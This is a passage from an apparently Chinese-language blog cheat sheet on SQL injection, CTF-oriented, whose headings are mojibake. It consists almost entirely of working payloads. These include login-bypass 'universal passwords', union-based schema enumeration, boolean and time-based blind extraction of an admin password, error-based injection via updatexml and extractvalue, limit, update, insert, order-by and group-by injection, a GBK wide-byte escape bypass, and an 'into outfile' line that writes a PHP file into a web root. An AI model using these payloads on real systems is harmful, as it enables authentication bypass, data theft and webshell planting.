title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; --</span><br><span class="line">admin&#x27; #</span><br><span class="line">admin&#x27;/\*</span><br><span class="line">&#x27; or 1=1--</span><br><span class="line">&#x27; or 1=1#</span><br><span class="line">&#x27; or 1=1/*</span><br><span class="line">&#x27;) or &#x27;1&#x27;=&#x27;1--</span><br><span class="line">&#x27;) or (&#x27;1&#x27;=&#x27;1-- </span><br><span class="line">1&#x27;^1#       (Falseæ³¨å…¥)</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="æ‰‹æ³¨"><a href="#æ‰‹æ³¨" class="headerlink" title="æ‰‹æ³¨"></a>æ‰‹æ³¨</h3><h4 id="æ­£å¸¸æ³¨å…¥æ­¥éª¤ï¼ˆè”åˆæŸ¥è¯¢ï¼‰"><a href="#æ­£å¸¸æ³¨å…¥æ­¥éª¤ï¼ˆè”åˆæŸ¥è¯¢ï¼‰" class="headerlink" title="æ­£å¸¸æ³¨å…¥æ­¥éª¤ï¼ˆè”åˆæŸ¥è¯¢ï¼‰"></a>æ­£å¸¸æ³¨å…¥æ­¥éª¤ï¼ˆè”åˆæŸ¥è¯¢ï¼‰</h4><p><strong>æŸ¥åº“å-&gt;æŸ¥è¡¨å-&gt;æŸ¥åˆ—åï¼ˆå­—æ®µåï¼‰-&gt;æŸ¥å€¼ï¼ˆæ•°æ®ï¼‰</strong></p><ul><li><p>å­—æ®µæ•°é‡çŒœè§£</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ¤æ–­é¡µé¢å›æ˜¾æ•°æ®å­—æ®µä½ç½®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,x... <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL8æ–°ç‰¹æ€§(&gt;8.0.21)</span></span><br><span class="line"><span class="keyword">table</span> information_schema.TABLESPACES_EXTENSIONS</span><br></pre></td></tr></table></figure></li><li><p>è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name),<span class="number">4</span>,xxxx <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><ul><li><p>unionæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> TABLE_SCHEMA<span class="operator">=</span>database();   <span class="comment">/* åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®åº“ä¸­çš„è¡¨ */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL 4ç‰ˆæœ¬æ—¶ç”¨version=9ï¼ŒMySQL 5ç‰ˆæœ¬æ—¶ç”¨version=10</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> GROUP_CONCAT(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> version<span class="operator">=</span><span class="number">10</span>;   <span class="comment">/* åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­çš„è¡¨ */</span></span><br><span class="line"><span class="keyword">SELECT</span> table_schema, table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">!=</span><span class="string">&#x27;information_schema&#x27;</span> <span class="keyword">AND</span> table_schema<span class="operator">!=</span><span class="string">&#x27;mysql&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>ç›²æ³¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.tables <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL8æ–°ç‰¹æ€§</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">table</span> information_schema.TABLESPACES_EXTENSIONS limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="type">BINARY</span>(<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;0&#x27;</span>)#</span><br></pre></td></tr></table></figure></li><li><p>æŠ¥é”™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span>(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">GROUP</span> <span class="keyword">BY</span> CONCAT((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables LIMIT <span class="number">1</span>),<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))) (@:<span class="operator">=</span><span class="number">1</span>)<span class="operator">||</span>@ <span class="keyword">GROUP</span> <span class="keyword">BY</span> CONCAT((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables LIMIT <span class="number">1</span>),<span class="operator">!</span>@) <span class="keyword">HAVING</span> @<span class="operator">||</span><span class="built_in">MIN</span>(@:<span class="operator">=</span><span class="number">0</span>); <span class="keyword">AND</span> ExtractValue(<span class="number">1</span>, CONCAT(<span class="number">0x5c</span>, (<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables LIMIT <span class="number">1</span>)));</span><br><span class="line"><span class="comment">-- åœ¨5.1.5ç‰ˆæœ¬ä¸­æˆåŠŸã€‚</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>åˆ—åï¼ˆå­—æ®µåï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name),<span class="number">4</span>,xxxx <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>(table_name) <span class="comment">/*æ­¤å¤„çš„è¡¨åä¸ºå­—ç¬¦ä¸²å‹ï¼Œä¹Ÿé€šè¿‡åå…­è¿›åˆ¶è¡¨ç¤º*/</span></span><br></pre></td></tr></table></figure><ul><li><p>unionæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> GROUP_CONCAT(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;tablename&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>ç›²æ³¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(column_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.columns <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>æŠ¥é”™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åœ¨5.1.5ç‰ˆæœ¬ä¸­æˆåŠŸ</span></span><br><span class="line"><span class="keyword">AND</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> SOME_EXISTING_TABLE <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> LIMIT <span class="number">1</span>)</span><br><span class="line"><span class="comment">-- MySQL 5.1ç‰ˆæœ¬ä¿®å¤äº†</span></span><br><span class="line"><span class="keyword">AND</span>(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">GROUP</span> <span class="keyword">BY</span> CONCAT((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns LIMIT <span class="number">1</span>),<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))) (@:<span class="operator">=</span><span class="number">1</span>)<span class="operator">||</span>@ <span class="keyword">GROUP</span> <span class="keyword">BY</span> CONCAT((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns LIMIT <span class="number">1</span>),<span class="operator">!</span>@) <span class="keyword">HAVING</span> @<span class="operator">||</span><span class="built_in">MIN</span>(@:<span class="operator">=</span><span class="number">0</span>); <span class="keyword">AND</span> ExtractValue(<span class="number">1</span>, CONCAT(<span class="number">0x5c</span>, (<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns LIMIT <span class="number">1</span>)));</span><br></pre></td></tr></table></figure></li></ul></li><li><p>å€¼æŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,column_name,<span class="number">4</span>,xxx <span class="keyword">from</span> (database_name.)table_name</span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL8æ–°ç‰¹æ€§</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">table</span> flag limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="type">BINARY</span>(<span class="string">&#x27;a&#x27;</span>))#</span><br></pre></td></tr></table></figure></li></ul><h4 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h4><ul><li><h5 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h5><ul><li><h6 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h6><p>ä½¿ç”¨åœºæ™¯ï¼š<strong>å¯¹çœŸ/å‡æ¡ä»¶è¿”å›çš„å†…å®¹å¾ˆå®¹æ˜“åŒºåˆ†</strong>ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">where</span> <span class="operator">|</span> <span class="keyword">and</span>) if(substr((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>nouser <span class="keyword">or</span> length(database())<span class="operator">&gt;</span><span class="number">8</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>nouser <span class="keyword">or</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">130</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- é€šé…ç¬¦</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;xxx&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> passwd <span class="keyword">like</span> <span class="string">&#x27;&#123;&#125;%&#x27;</span>#</span><br></pre></td></tr></table></figure></li><li><h6 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h6><p>ä¾èµ–äºé€šè¿‡<strong>é¡µé¢è¿”å›çš„å»¶è¿Ÿæ—¶é—´</strong>æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®ã€‚</p><p>é€šå¸¸å¯åˆ©ç”¨çš„äº§ç”Ÿæ—¶é—´å»¶è¿Ÿçš„å‡½æ•°æœ‰ï¼š<strong>sleep()ã€benchmark()</strong>ï¼Œè¿˜æœ‰è®¸å¤šè¿›è¡Œ<strong>å¤æ‚è¿ç®—çš„å‡½æ•°</strong>ä¹Ÿå¯ä»¥å½“åšå»¶è¿Ÿçš„åˆ¤æ–­æ ‡å‡†ã€ç¬›å¡å°”ç§¯åˆå¹¶æ•°æ®è¡¨ã€GET_LOCKåŒSESSIONäº§ç”Ÿå»¶è¿Ÿç­‰æ–¹æ³•ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- sleep()</span></span><br><span class="line">(<span class="keyword">where</span> <span class="operator">|</span> <span class="keyword">and</span>) if(substr((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span>$username (<span class="keyword">and</span> <span class="operator">|</span> <span class="keyword">or</span>) if(length(database())<span class="operator">&gt;</span><span class="number">8</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- benchmark()</span></span><br><span class="line"><span class="keyword">or</span> benchmark(<span class="number">5000000</span>,md5(<span class="string">&#x27;test&#x27;</span>))</span><br><span class="line"><span class="keyword">or</span> if(length(database())<span class="operator">&gt;</span><span class="number">5</span>,benchmark(<span class="number">1500000</span>,md5(<span class="string">&#x27;test&#x27;</span>)),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- pg_sleep()</span></span><br><span class="line">(<span class="keyword">and</span> <span class="operator">|</span> <span class="keyword">or</span>) (<span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">select</span> substr(password,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> users)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> pg_sleep(<span class="number">5</span>) <span class="keyword">else</span> pg_sleep(<span class="number">0</span>) <span class="keyword">end</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(substr((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>) <span class="keyword">then</span> (<span class="keyword">select</span> <span class="string">&#x27;roarctf&#x27;</span> <span class="keyword">from</span> pg_sleep(<span class="number">3</span>)) <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">end</span>)<span class="operator">=</span><span class="string">&#x27;roarctf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ç¬›å¡å°”ç§¯ heavy query</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A, information_schema.columns B, information_schema.columns C);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(<span class="number">1</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span>,<span class="number">0</span>) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><h5 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h5><p>é€šè¿‡<strong>ç‰¹æ®Šå‡½æ•°</strong>çš„é”™è¯¯ä½¿ç”¨ä½¿å…¶å‚æ•°è¢«é¡µé¢è¾“å‡ºã€‚</p><p>å‰æï¼šæœåŠ¡å™¨å¼€å¯æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿé”™è¯¯æ—¶è¿”å›æŠ¥é”™ä¿¡æ¯ã€‚</p><p>å¸¸è§çš„åˆ©ç”¨å‡½æ•°æœ‰ï¼š<code>exp()ã€floor()+rand()ã€updatexml()ã€extractvalue()</code>ç­‰ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) pow(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a),<span class="number">9999</span>);</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>));</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br><span class="line">(<span class="keyword">where</span><span class="operator">|</span><span class="keyword">and</span><span class="operator">|</span><span class="keyword">or</span>) (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>,<span class="built_in">ceil</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br></pre></td></tr></table></figure></li><li><h5 id="limitæ³¨å…¥"><a href="#limitæ³¨å…¥" class="headerlink" title="limitæ³¨å…¥"></a>limitæ³¨å…¥</h5><p>ä½¿ç”¨ <code>PROCEDURE</code>å‡½æ•°è¿›è¡Œæ³¨å…¥ï¼ŒANALYSEæ”¯æŒä¸¤ä¸ªå‚æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select id from users order by id desc limit 0,1 procedure analyse(1,1);</span><br><span class="line">select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line">select id from users order by id desc limit 0,1 into outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED BY 0x16è¿›åˆ¶æ–‡ä»¶</span><br></pre></td></tr></table></figure></li><li><h5 id="updateæ³¨å…¥"><a href="#updateæ³¨å…¥" class="headerlink" title="updateæ³¨å…¥"></a>updateæ³¨å…¥</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#ç›²æ³¨</span><br><span class="line">update users set username = &#x27;0&#x27;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;</span><br><span class="line">update users set username = &#x27;0&#x27; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;</span><br><span class="line">update users set id = &#x27;1&#x27; where username like &#x27;f%&#x27; || sleep(5);</span><br></pre></td></tr></table></figure></li><li><h5 id="insertæ³¨å…¥"><a href="#insertæ³¨å…¥" class="headerlink" title="insertæ³¨å…¥"></a>insertæ³¨å…¥</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#ç›²æ³¨</span><br><span class="line">insert into users values (16,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));</span><br><span class="line">insert into users values (15,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d));</span><br></pre></td></tr></table></figure></li><li><h5 id="order-byæ³¨å…¥"><a href="#order-byæ³¨å…¥" class="headerlink" title="order byæ³¨å…¥"></a>order byæ³¨å…¥</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#æŠ¥é”™æ³¨å…¥</span><br><span class="line">select * from users order by updatexml(1,concat(0x7e,(select%20user()),0x7e),1);</span><br><span class="line"></span><br><span class="line">#ç›²æ³¨</span><br><span class="line">select * from users order by id ^(select(select version()) regexp &#x27;^5&#x27;);</span><br></pre></td></tr></table></figure></li><li><h5 id="group-byæ³¨å…¥"><a href="#group-byæ³¨å…¥" class="headerlink" title="group byæ³¨å…¥"></a>group byæ³¨å…¥</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ç›²æ³¨</span><br><span class="line">select * from users group by 1 having substr((select database()),1,1)=&#x27;c&#x27;</span><br></pre></td></tr></table></figure></li></ul><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><p>å›½å†…æœ€å¸¸ä½¿ç”¨çš„ GBK ç¼–ç ï¼Œè¿™ç§æ–¹å¼ä¸»è¦æ˜¯ç»•è¿‡ <code>addslashes</code> ç­‰å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ç§»çš„ç»•è¿‡ã€‚åæ–œæ  <code>\</code> çš„åå…­è¿›åˆ¶ä¸º <code>%5c</code>ï¼Œåœ¨ä½ è¾“å…¥ <code>%bf%27</code> æ—¶ï¼Œå‡½æ•°é‡åˆ°å•å¼•å·è‡ªåŠ¨è½¬ç§»åŠ å…¥ <code>\</code>ï¼Œæ­¤æ—¶å˜ä¸º <code>%bf%5c%27</code>ï¼Œ<code>%bf%5c</code> åœ¨ GBK ä¸­å˜ä¸ºä¸€ä¸ªå®½å­—ç¬¦ã€Œç¸—ã€ã€‚<strong><code>%bf</code></strong> é‚£ä¸ªä½ç½®å¯ä»¥æ˜¯ <code>%81-%fe</code> ä¸­é—´çš„ä»»ä½•å­—ç¬¦ã€‚ä¸æ­¢åœ¨ SQL æ³¨å…¥ä¸­ï¼Œå®½å­—ç¬¦æ³¨å…¥åœ¨å¾ˆå¤šåœ°æ–¹éƒ½å¯ä»¥åº”ç”¨ã€‚</p><p>GETæ–¹å¼ï¼šåˆ©ç”¨URLencode <code>?id=1%df&#39;||1=&#123;payload&#125;%23</code></p><p>POSTæ–¹å¼ï¼šåˆ©ç”¨UTF-16æˆ–UTF-32æˆ–ä¸­æ–‡ <code>?id=1æˆ‘&#39;||1=&#123;payload&#125;#</code></p><p>â€‹</p><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å 